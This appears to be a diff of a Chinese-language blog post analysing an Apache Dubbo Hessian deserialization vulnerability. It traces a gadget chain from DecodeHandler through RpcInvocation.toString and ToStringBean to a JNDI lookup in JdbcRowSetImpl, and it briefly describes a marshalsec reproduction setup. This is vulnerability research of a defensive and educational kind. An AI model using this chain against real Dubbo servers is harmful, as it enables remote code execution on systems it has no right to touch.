+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DecodeHandler</span> <span class="keyword">extends</span> <span class="title class_">AbstractChannelHandlerDelegate</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">received</span><span class="params">(Channel channel, Object message)</span> <span class="keyword">throws</span> RemotingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Decodeable) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(((Request)message).getData());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(((Response)message).getResult());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.handler.received(channel, message); <span class="comment">// 持续跟进函数，会在一个getInvoker()地方抛出错误</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-    public void received(Channel channel, Object message) throws RemotingException &#123;
-        if (message instanceof Decodeable) &#123;
-            this.decode(message);
-        &#125;
 
-        if (message instanceof Request) &#123;
-            this.decode(((Request)message).getData());
-        &#125;
 
-        if (message instanceof Response) &#123;
-            this.decode(((Response)message).getResult());
-        &#125;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DubboProtocol</span> <span class="keyword">extends</span> <span class="title class_">AbstractProtocol</span> &#123;</span><br><span class="line">    </span><br><span class="line">    Invoker&lt;?&gt; getInvoker(Channel channel, Invocation inv) <span class="keyword">throws</span> RemotingException &#123;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isCallBackServiceInvoke</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">isStubServiceInvoke</span> <span class="operator">=</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> channel.getLocalAddress().getPort();</span><br><span class="line">        <span class="type">String</span> <span class="variable">path</span> <span class="operator">=</span> (String)inv.getAttachments().get(<span class="string">&quot;path&quot;</span>);</span><br><span class="line">        isStubServiceInvoke = Boolean.TRUE.toString().equals(inv.getAttachments().get(<span class="string">&quot;dubbo.stub.event&quot;</span>));</span><br><span class="line">        <span class="keyword">if</span> (isStubServiceInvoke) &#123;</span><br><span class="line">            port = channel.getRemoteAddress().getPort();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        isCallBackServiceInvoke = <span class="built_in">this</span>.isClientSide(channel) &amp;&amp; !isStubServiceInvoke;</span><br><span class="line">        <span class="keyword">if</span> (isCallBackServiceInvoke) &#123;</span><br><span class="line">            path = path + <span class="string">&quot;.&quot;</span> + (String)inv.getAttachments().get(<span class="string">&quot;callback.service.instid&quot;</span>);</span><br><span class="line">            inv.getAttachments().put(<span class="string">&quot;_isCallBackServiceInvoke&quot;</span>, Boolean.TRUE.toString());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">serviceKey</span> <span class="operator">=</span> serviceKey(port, path, (String)inv.getAttachments().get(<span class="string">&quot;version&quot;</span>), (String)inv.getAttachments().get(<span class="string">&quot;group&quot;</span>));</span><br><span class="line">        DubboExporter&lt;?&gt; exporter = (DubboExporter)<span class="built_in">this</span>.exporterMap.get(serviceKey);</span><br><span class="line">        <span class="keyword">if</span> (exporter == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">RemotingException</span>(channel, <span class="string">&quot;Not found exported service: &quot;</span> + serviceKey + <span class="string">&quot; in &quot;</span> + <span class="built_in">this</span>.exporterMap.keySet() + <span class="string">&quot;, may be version or group mismatch , channel: consumer: &quot;</span> + channel.getRemoteAddress() + <span class="string">&quot; --&gt; provider: &quot;</span> + channel.getLocalAddress() + <span class="string">&quot;, message:&quot;</span> + inv); <span class="comment">// 在这里抛出错误，因为涉及了字符串操作，所以会调用对应类的toString()方法</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> exporter.getInvoker();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-        this.handler.received(channel, message); // 持续跟进函数，会在一个getInvoker()地方抛出错误
-    &#125;</code></pre>
-<pre><code class="java">public class DubboProtocol extends AbstractProtocol &#123;
-
-    Invoker&lt;?&gt; getInvoker(Channel channel, Invocation inv) throws RemotingException &#123;
-        boolean isCallBackServiceInvoke = false;
-        boolean isStubServiceInvoke = false;
-        int port = channel.getLocalAddress().getPort();
-        String path = (String)inv.getAttachments().get(&quot;path&quot;);
-        isStubServiceInvoke = Boolean.TRUE.toString().equals(inv.getAttachments().get(&quot;dubbo.stub.event&quot;));
-        if (isStubServiceInvoke) &#123;
-            port = channel.getRemoteAddress().getPort();
-        &#125;
-
-        isCallBackServiceInvoke = this.isClientSide(channel) &amp;&amp; !isStubServiceInvoke;
-        if (isCallBackServiceInvoke) &#123;
-            path = path + &quot;.&quot; + (String)inv.getAttachments().get(&quot;callback.service.instid&quot;);
-            inv.getAttachments().put(&quot;_isCallBackServiceInvoke&quot;, Boolean.TRUE.toString());
-        &#125;
-
-        String serviceKey = serviceKey(port, path, (String)inv.getAttachments().get(&quot;version&quot;), (String)inv.getAttachments().get(&quot;group&quot;));
-        DubboExporter&lt;?&gt; exporter = (DubboExporter)this.exporterMap.get(serviceKey);
-        if (exporter == null) &#123;
-            throw new RemotingException(channel, &quot;Not found exported service: &quot; + serviceKey + &quot; in &quot; + this.exporterMap.keySet() + &quot;, may be version or group mismatch , channel: consumer: &quot; + channel.getRemoteAddress() + &quot; --&gt; provider: &quot; + channel.getLocalAddress() + &quot;, message:&quot; + inv); // 在这里抛出错误，因为涉及了字符串操作，所以会调用对应类的toString()方法
-        &#125; else &#123;
-            return exporter.getInvoker();
-        &#125;
-    &#125;</code></pre>
 <p>来到了<code>RpcInvocation</code>类</p>
-<pre><code class="java">public class RpcInvocation implements Invocation, Serializable &#123;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RpcInvocation</span> <span class="keyword">implements</span> <span class="title class_">Invocation</span>, Serializable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;RpcInvocation [methodName=&quot;</span> + <span class="built_in">this</span>.methodName + <span class="string">&quot;, parameterTypes=&quot;</span> + Arrays.toString(<span class="built_in">this</span>.parameterTypes) + <span class="string">&quot;, arguments=&quot;</span> + Arrays.toString(<span class="built_in">this</span>.arguments) + <span class="string">&quot;, attachments=&quot;</span> + <span class="built_in">this</span>.attachments + <span class="string">&quot;]&quot;</span>; <span class="comment">// 对我们传入的类调用了Arrays.toString()方法</span></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-    public String toString() &#123;
-        return &quot;RpcInvocation [methodName=&quot; + this.methodName + &quot;, parameterTypes=&quot; + Arrays.toString(this.parameterTypes) + &quot;, arguments=&quot; + Arrays.toString(this.arguments) + &quot;, attachments=&quot; + this.attachments + &quot;]&quot;; // 对我们传入的类调用了Arrays.toString()方法
-    &#125;</code></pre>
 <p>来到了<code>ToStringBean</code>类的Gadget</p>
-<pre><code class="java">public class ToStringBean implements Serializable &#123;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ToStringBean</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">toString</span><span class="params">(String prefix)</span> &#123;</span><br><span class="line">        <span class="type">StringBuffer</span> <span class="variable">sb</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuffer</span>(<span class="number">128</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            List&lt;PropertyDescriptor&gt; propertyDescriptors = BeanIntrospector.getPropertyDescriptorsWithGetters(<span class="built_in">this</span>.beanClass);</span><br><span class="line">            <span class="type">Iterator</span> <span class="variable">var10</span> <span class="operator">=</span> propertyDescriptors.iterator();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">while</span>(var10.hasNext()) &#123;</span><br><span class="line">                <span class="type">PropertyDescriptor</span> <span class="variable">propertyDescriptor</span> <span class="operator">=</span> (PropertyDescriptor)var10.next();</span><br><span class="line">                <span class="type">String</span> <span class="variable">propertyName</span> <span class="operator">=</span> propertyDescriptor.getName();</span><br><span class="line">                <span class="type">Method</span> <span class="variable">getter</span> <span class="operator">=</span> propertyDescriptor.getReadMethod();</span><br><span class="line">                <span class="type">Object</span> <span class="variable">value</span> <span class="operator">=</span> getter.invoke(<span class="built_in">this</span>.obj, NO_PARAMS); <span class="comment">// 调用相应类的get()方法</span></span><br><span class="line">                <span class="built_in">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + propertyName, value);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var9) &#123;</span><br><span class="line">            LOG.error(<span class="string">&quot;Error while generating toString&quot;</span>, var9);</span><br><span class="line">            Class&lt;? <span class="keyword">extends</span> <span class="title class_">Object</span>&gt; clazz = <span class="built_in">this</span>.obj.getClass();</span><br><span class="line">            <span class="type">String</span> <span class="variable">errorMessage</span> <span class="operator">=</span> var9.getMessage();</span><br><span class="line">            sb.append(String.format(<span class="string">&quot;\n\nEXCEPTION: Could not complete %s.toString(): %s\n&quot;</span>, clazz, errorMessage));</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure>
 
-    private String toString(String prefix) &#123;
-        StringBuffer sb = new StringBuffer(128);
-
-        try &#123;
-            List&lt;PropertyDescriptor&gt; propertyDescriptors = BeanIntrospector.getPropertyDescriptorsWithGetters(this.beanClass);
-            Iterator var10 = propertyDescriptors.iterator();
-
-            while(var10.hasNext()) &#123;
-                PropertyDescriptor propertyDescriptor = (PropertyDescriptor)var10.next();
-                String propertyName = propertyDescriptor.getName();
-                Method getter = propertyDescriptor.getReadMethod();
-                Object value = getter.invoke(this.obj, NO_PARAMS); // 调用相应类的get()方法
-                this.printProperty(sb, prefix + &quot;.&quot; + propertyName, value);
-            &#125;
-        &#125; catch (Exception var9) &#123;
-            LOG.error(&quot;Error while generating toString&quot;, var9);
-            Class&lt;? extends Object&gt; clazz = this.obj.getClass();
-            String errorMessage = var9.getMessage();
-            sb.append(String.format(&quot;\n\nEXCEPTION: Could not complete %s.toString(): %s\n&quot;, clazz, errorMessage));
-        &#125;</code></pre>
 <p>只要我们的<code>JdbcRowSetImpl</code>类设置了<code>databaseMetaData</code>属性就会调其<code>get()</code>方法，也就能触发其<code>lookup()</code>函数触发JNDI注入</p>
-<pre><code class="java">public class JdbcRowSetImpl extends BaseRowSet implements JdbcRowSet, Joinable &#123;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">JdbcRowSetImpl</span> <span class="keyword">extends</span> <span class="title class_">BaseRowSet</span> <span class="keyword">implements</span> <span class="title class_">JdbcRowSet</span>, Joinable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> DatabaseMetaData <span class="title function_">getDatabaseMetaData</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="type">Connection</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="built_in">this</span>.connect(); <span class="comment">// 跟进connect()</span></span><br><span class="line">        <span class="keyword">return</span> var1.getMetaData();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> Connection <span class="title function_">connect</span><span class="params">()</span> <span class="keyword">throws</span> SQLException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.conn != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.conn;</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>.getDataSourceName() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">InitialContext</span> <span class="variable">var1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">                <span class="type">DataSource</span> <span class="variable">var2</span> <span class="operator">=</span> (DataSource)var1.lookup(<span class="built_in">this</span>.getDataSourceName()); <span class="comment">// 触发JNDI注入</span></span><br><span class="line">                <span class="keyword">return</span> <span class="built_in">this</span>.getUsername() != <span class="literal">null</span> &amp;&amp; !<span class="built_in">this</span>.getUsername().equals(<span class="string">&quot;&quot;</span>) ? var2.getConnection(<span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : var2.getConnection();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NamingException var3) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SQLException</span>(<span class="built_in">this</span>.resBundle.handleGetObject(<span class="string">&quot;jdbcrowsetimpl.connect&quot;</span>).toString());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="built_in">this</span>.getUrl() != <span class="literal">null</span> ? DriverManager.getConnection(<span class="built_in">this</span>.getUrl(), <span class="built_in">this</span>.getUsername(), <span class="built_in">this</span>.getPassword()) : <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-    public DatabaseMetaData getDatabaseMetaData() throws SQLException &#123;
-        Connection var1 = this.connect(); // 跟进connect()
-        return var1.getMetaData();
-    &#125;
-
-    private Connection connect() throws SQLException &#123;
-        if (this.conn != null) &#123;
-            return this.conn;
-        &#125; else if (this.getDataSourceName() != null) &#123;
-            try &#123;
-                InitialContext var1 = new InitialContext();
-                DataSource var2 = (DataSource)var1.lookup(this.getDataSourceName()); // 触发JNDI注入
-                return this.getUsername() != null &amp;&amp; !this.getUsername().equals(&quot;&quot;) ? var2.getConnection(this.getUsername(), this.getPassword()) : var2.getConnection();
-            &#125; catch (NamingException var3) &#123;
-                throw new SQLException(this.resBundle.handleGetObject(&quot;jdbcrowsetimpl.connect&quot;).toString());
-            &#125;
-        &#125; else &#123;
-            return this.getUrl() != null ? DriverManager.getConnection(this.getUrl(), this.getUsername(), this.getPassword()) : null;
-        &#125;
-    &#125;
-</code></pre>
 <h4 id="Java版本"><a href="#Java版本" class="headerlink" title="Java版本"></a>Java版本</h4><p><strong>漏洞利用</strong></p>
 <p>IDEA导入marshalsec</p>
 <img src="C:\Users\Tyao\AppData\Roaming\Typora\typora-user-images\image-20210605150037087.png" alt="image-20210605150037087" style="zoom:67%;" />
 
 <p>修改<code>DemoService.java</code>，添加接口</p>
-<pre><code class="java">String commonTest(Object o);</code></pre>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">String <span class="title function_">commonTest</span><span class="params">(Object o)</span>;</span><br></pre></td></tr></table></figure>
+
 <p>修改<code>DefaultDemoService.java</code>，实现接口</p>
-<pre><code class="java">@Override
-public String commonTest(Object o) &#123;
-    return &quot;pwned&quot;;
-&#125;</code></pre>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">commonTest</span><span class="params">(Object o)</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;pwned&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
 <p>修改<code>DubboAutoConfigurationConsumerBootstrap.java</code>，修改runner运行<code>commonTest()</code>方法</p>
 <p><strong>漏洞分析</strong></p>
 <p>漏洞链如下</p>
 <img src="https://raw.githubusercontent.com/Tyaoo/PicBed/master/img/PicGo-Github-PicBed/202106060011ed6ac1e20048a0fd8c2a.png" alt="image-20210606001138974" style="zoom:80%;" />
 
 <p>入口点也在<code>DecodeHandler</code>类的<code>received</code>方法</p>
-<pre><code class="java">public class DecodeHandler extends AbstractChannelHandlerDelegate &#123;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DecodeHandler</span> <span class="keyword">extends</span> <span class="title class_">AbstractChannelHandlerDelegate</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">received</span><span class="params">(Channel channel, Object message)</span> <span class="keyword">throws</span> RemotingException &#123;</span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Decodeable) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(message);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Request) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(((Request)message).getData()); <span class="comment">// 跟进decode()</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Response) &#123;</span><br><span class="line">            <span class="built_in">this</span>.decode(((Response)message).getResult());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">this</span>.handler.received(channel, message);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">(Object message)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (message <span class="keyword">instanceof</span> Decodeable) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                ((Decodeable)message).decode(); <span class="comment">// 跟进Decodeable的decode()</span></span><br><span class="line">                <span class="keyword">if</span> (log.isDebugEnabled()) &#123;</span><br><span class="line">                    log.debug(<span class="string">&quot;Decode decodeable message &quot;</span> + message.getClass().getName());</span><br><span class="line">                &#125;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var3) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">                    log.warn(<span class="string">&quot;Call Decodeable.decode failed: &quot;</span> + var3.getMessage(), var3);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-    public void received(Channel channel, Object message) throws RemotingException &#123;
-        if (message instanceof Decodeable) &#123;
-            this.decode(message);
-        &#125;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">DecodeableRpcInvocation</span> <span class="keyword">extends</span> <span class="title class_">RpcInvocation</span> <span class="keyword">implements</span> <span class="title class_">Codec</span>, Decodeable &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">decode</span><span class="params">()</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">this</span>.hasDecoded &amp;&amp; <span class="built_in">this</span>.channel != <span class="literal">null</span> &amp;&amp; <span class="built_in">this</span>.inputStream != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.decode(<span class="built_in">this</span>.channel, <span class="built_in">this</span>.inputStream); <span class="comment">// 跟进decode()</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Throwable var5) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">                    log.warn(<span class="string">&quot;Decode rpc invocation failed: &quot;</span> + var5.getMessage(), var5);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="built_in">this</span>.request.setBroken(<span class="literal">true</span>);</span><br><span class="line">                <span class="built_in">this</span>.request.setData(var5);</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="built_in">this</span>.hasDecoded = <span class="literal">true</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">decode</span><span class="params">(Channel channel, InputStream input)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">		</span><br><span class="line">        ...</span><br><span class="line">        args = <span class="keyword">new</span> <span class="title class_">Object</span>[pts.length];</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; args.length; ++i) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                args[i] = in.readObject(pts[i]); <span class="comment">// 进入反序列化</span></span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var17) &#123;</span><br><span class="line">                <span class="keyword">if</span> (log.isWarnEnabled()) &#123;</span><br><span class="line">                    log.warn(<span class="string">&quot;Decode argument failed: &quot;</span> + var17.getMessage(), var17);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">		...</span><br></pre></td></tr></table></figure>
 
-        if (message instanceof Request) &#123;
-            this.decode(((Request)message).getData()); // 跟进decode()
-        &#125;
-
-        if (message instanceof Response) &#123;
-            this.decode(((Response)message).getResult());
-        &#125;
-
-        this.handler.received(channel, message);
-    &#125;
-
-    private void decode(Object message) &#123;
-        if (message instanceof Decodeable) &#123;
-            try &#123;
-                ((Decodeable)message).decode(); // 跟进Decodeable的decode()
-                if (log.isDebugEnabled()) &#123;
-                    log.debug(&quot;Decode decodeable message &quot; + message.getClass().getName());
-                &#125;
-            &#125; catch (Throwable var3) &#123;
-                if (log.isWarnEnabled()) &#123;
-                    log.warn(&quot;Call Decodeable.decode failed: &quot; + var3.getMessage(), var3);
-                &#125;
-            &#125;
-        &#125;
-    &#125;</code></pre>
-<pre><code class="java">public class DecodeableRpcInvocation extends RpcInvocation implements Codec, Decodeable &#123;
-
-    public void decode() throws Exception &#123;
-        if (!this.hasDecoded &amp;&amp; this.channel != null &amp;&amp; this.inputStream != null) &#123;
-            try &#123;
-                this.decode(this.channel, this.inputStream); // 跟进decode()
-            &#125; catch (Throwable var5) &#123;
-                if (log.isWarnEnabled()) &#123;
-                    log.warn(&quot;Decode rpc invocation failed: &quot; + var5.getMessage(), var5);
-                &#125;
-
-                this.request.setBroken(true);
-                this.request.setData(var5);
-            &#125; finally &#123;
-                this.hasDecoded = true;
-            &#125;
-        &#125;
-
-    &#125;
-
-    public Object decode(Channel channel, InputStream input) throws IOException &#123;
-
-        ...
-        args = new Object[pts.length];
-
-        for(int i = 0; i &lt; args.length; ++i) &#123;
-            try &#123;
-                args[i] = in.readObject(pts[i]); // 进入反序列化
-            &#125; catch (Exception var17) &#123;
-                if (log.isWarnEnabled()) &#123;
-                    log.warn(&quot;Decode argument failed: &quot; + var17.getMessage(), var17);
-                &#125;
-            &#125;
-        &#125;
-        ...</code></pre>
 <p>一路<code>readObject()</code>会来到下面的<code>readMap()</code>方法</p>
-<pre><code class="java">public class Hessian2Input extends AbstractHessianInput implements Hessian2Constants &#123;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Hessian2Input</span> <span class="keyword">extends</span> <span class="title class_">AbstractHessianInput</span> <span class="keyword">implements</span> <span class="title class_">Hessian2Constants</span> &#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">readObject</span><span class="params">(List&lt;Class&lt;?&gt;&gt; expectedTypes)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    </span><br><span class="line">    	...</span><br><span class="line">        <span class="keyword">case</span> <span class="number">72</span>:</span><br><span class="line">            <span class="type">boolean</span> <span class="variable">keyValuePair</span> <span class="operator">=</span> expectedTypes != <span class="literal">null</span> &amp;&amp; expectedTypes.size() == <span class="number">2</span>;</span><br><span class="line">            reader = <span class="built_in">this</span>.findSerializerFactory().getDeserializer(Map.class);</span><br><span class="line">            <span class="keyword">return</span> reader.readMap(<span class="built_in">this</span>, keyValuePair ? (Class)expectedTypes.get(<span class="number">0</span>) : <span class="literal">null</span>, keyValuePair ? (Class)expectedTypes.get(<span class="number">1</span>) : <span class="literal">null</span>); <span class="comment">// 进入readMap()方法</span></span><br><span class="line">        ...</span><br></pre></td></tr></table></figure>
 
-    public Object readObject(List&lt;Class&lt;?&gt;&gt; expectedTypes) throws IOException &#123;
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MapDeserializer</span> <span class="keyword">extends</span> <span class="title class_">AbstractMapDeserializer</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">readMap</span><span class="params">(AbstractHessianInput in, Class&lt;?&gt; expectKeyType, Class&lt;?&gt; expectValueType)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Object map;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>._type == <span class="literal">null</span>) &#123;</span><br><span class="line">            map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>._type.equals(Map.class)) &#123;</span><br><span class="line">            map = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="built_in">this</span>._type.equals(SortedMap.class)) &#123;</span><br><span class="line">            map = <span class="keyword">new</span> <span class="title class_">TreeMap</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                map = (Map)<span class="built_in">this</span>._ctor.newInstance();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception var6) &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IOExceptionWrapper</span>(var6);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        in.addRef(map);</span><br><span class="line">        <span class="built_in">this</span>.doReadMap(in, (Map)map, expectKeyType, expectValueType); <span class="comment">// 跟进doReadMap()</span></span><br><span class="line">        in.readEnd();</span><br><span class="line">        <span class="keyword">return</span> map;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doReadMap</span><span class="params">(AbstractHessianInput in, Map map, Class&lt;?&gt; keyType, Class&lt;?&gt; valueType)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">Deserializer</span> <span class="variable">keyDeserializer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">Deserializer</span> <span class="variable">valueDeserializer</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="type">SerializerFactory</span> <span class="variable">factory</span> <span class="operator">=</span> <span class="built_in">this</span>.findSerializerFactory(in);</span><br><span class="line">        <span class="keyword">if</span> (keyType != <span class="literal">null</span>) &#123;</span><br><span class="line">            keyDeserializer = factory.getDeserializer(keyType.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (valueType != <span class="literal">null</span>) &#123;</span><br><span class="line">            valueDeserializer = factory.getDeserializer(valueType.getName());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(!in.isEnd()) &#123;</span><br><span class="line">            map.put(keyDeserializer != <span class="literal">null</span> ? keyDeserializer.readObject(in) : in.readObject(), valueDeserializer != <span class="literal">null</span> ? valueDeserializer.readObject(in) : in.readObject()); <span class="comment">// 进行反序列化两次</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
 
-        ...
-        case 72:
-            boolean keyValuePair = expectedTypes != null &amp;&amp; expectedTypes.size() == 2;
-            reader = this.findSerializerFactory().getDeserializer(Map.class);
-            return reader.readMap(this, keyValuePair ? (Class)expectedTypes.get(0) : null, keyValuePair ? (Class)expectedTypes.get(1) : null); // 进入readMap()方法
-        ...</code></pre>
-<pre><code class="java">public class MapDeserializer extends AbstractMapDeserializer &#123;
-
-    public Object readMap(AbstractHessianInput in, Class&lt;?&gt; expectKeyType, Class&lt;?&gt; expectValueType) throws IOException &#123;
-        Object map;
-        if (this._type == null) &#123;
-            map = new HashMap();
-        &#125; else if (this._type.equals(Map.class)) &#123;
-            map = new HashMap();
-        &#125; else if (this._type.equals(SortedMap.class)) &#123;
-            map = new TreeMap();
-        &#125; else &#123;
-            try &#123;
-                map = (Map)this._ctor.newInstance();
-            &#125; catch (Exception var6) &#123;
-                throw new IOExceptionWrapper(var6);
-            &#125;
-        &#125;
-
-        in.addRef(map);
-        this.doReadMap(in, (Map)map, expectKeyType, expectValueType); // 跟进doReadMap()
-        in.readEnd();
-        return map;
-    &#125;
-
